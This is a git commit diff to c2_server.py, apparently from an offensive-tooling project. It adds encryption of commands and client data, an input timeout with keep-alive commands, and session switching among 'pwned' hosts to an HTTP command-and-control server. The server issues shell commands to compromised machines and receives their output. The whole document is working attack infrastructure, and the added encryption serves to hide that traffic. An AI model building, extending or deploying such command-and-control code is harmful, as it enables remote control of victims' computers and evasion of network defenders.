e4f3717b8b05b84b11d0f80d74462705aaf859e2
byt3scr1b3 <89225495+byt3scr1b3@users.noreply.github.com>
2024-03-04 20:57:00 +0100

    added symmetric encryption

--- c2_server.py
+++ c2_server.py
@@ -1,6 +1,35 @@
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib.parse import unquote_plus
-from settings import PORT, CMD_REQUEST, CWD_RESPONSE, RESPONSE, RESPONSE_KEY, BIND_ADDR
+from inputimeout import inputimeout, TimeoutOccurred
+from encryption import cipher
+from settings import PORT, CMD_REQUEST, CWD_RESPONSE, INPUT_TIMEOUT, KEEP_ALIVE_CMD, RESPONSE, RESPONSE_KEY, BIND_ADDR
+
+
+def get_new_session():
+    global active_session, pwned_dict, pwned_id
+
+    del pwned_dict[active_session]
+
+    if not pwned_dict:
+        print("Waiting for new connections.\n")
+        pwned_id = 0
+        active_session = 1
+    else:
+        while True:
+            print(*pwned_dict.items(), sep="\n")
+            try:
+                new_session = int(input("\nChoose a session number to make active: "))
+            except ValueError:
+                print("\nYou must choose a pwned id of one of the sessions shown on the screen\n")
+                continue
+
+            if new_session in pwned_dict:
+                active_session = new_session
+                print(f"\nActive session is now: {pwned_dict[active_session]}")
+                break
+            else:
+                print("\nYou must choose a pwned id of one of the sessions shown on the screen.\n")
+                continue
 
 
 class C2Handler(BaseHTTPRequestHandler):
@@ -13,6 +42,8 @@ class C2Handler(BaseHTTPRequestHandler):
         if self.path.startswith(CMD_REQUEST):
 
             client = self.path.split(CMD_REQUEST)[1]
+
+            client = cipher.decrypt(client.encode()).decode()
 
             client_account = client.split('@')[0]
 
@@ -29,36 +60,29 @@ class C2Handler(BaseHTTPRequestHandler):
 
             elif client == pwned_dict[active_session]:
 
-                command = input(f"{client_account}@{client_hostname}:{cwd}$ ")
+                if INPUT_TIMEOUT:
+
+                    try:
+                        command = inputimeout(prompt=f"{client_account}@{client_hostname}:{cwd}$ ",
+                                              timeout=INPUT_TIMEOUT)
+
+                    except TimeoutOccurred:
+                        command = KEEP_ALIVE_CMD
+                else:
+
+                    command = input(f"{client_account}@{client_hostname}:{cwd}$ ")
 
                 try:
                     self.http_response(200)
-                    self.wfile.write(command.encode())
+                    self.wfile.write(cipher.encrypt(command.encode()))
 
                 except BrokenPipeError:
                     print(f"Lost connection to {pwned_dict[active_session]}.\n")
-                    del pwned_dict[active_session]
+                    get_new_session()
 
-                    if not pwned_dict:
-                        print("Waiting for new connections.\n")
-                        pwned_id = 0
-                        active_session = 1
-                    else:
-                        while True:
-                            print(*pwned_dict.items(), sep="\n")
-                            try:
-                                new_session = int(input("\nChoose a session number to make active: "))
-                            except ValueError:
-                                print("\nYou must choose a pwned id of one of the sessions shown on the screen\n")
-                                continue
+                if command.startswith("client kill"):
+                    get_new_session()
 
-                            if new_session in pwned_dict:
-                                active_session = new_session
-                                print(f"\nActive session is now: {pwned_dict[active_session]}")
-                                break
-                            else:
-                                print("\nYou must choose a pwned id of one of the sessions shown on the screen.\n")
-                                continue
             else:
 
                 self.http_response(404)
@@ -91,17 +115,17 @@ class C2Handler(BaseHTTPRequestHandler):
 
         client_data = unquote_plus(client_data)
 
+        client_data = cipher.decrypt(client_data.encode()).decode()
+
         return client_data
 
     def http_response(self, code: int):
-        """ Function that sends the HTTP response code and headers back to the client. """
         self.send_response(code)
         self.end_headers()
 
     def log_request(self, code="-", size="-"):
-        """ Included this to override BaseHTTPRequestHandler's log_request method because it writes to the
-        screen.  Ours doesn't log any successful connections; it just returns, which is what we want. """
         return
+
 
 active_session = 1
 
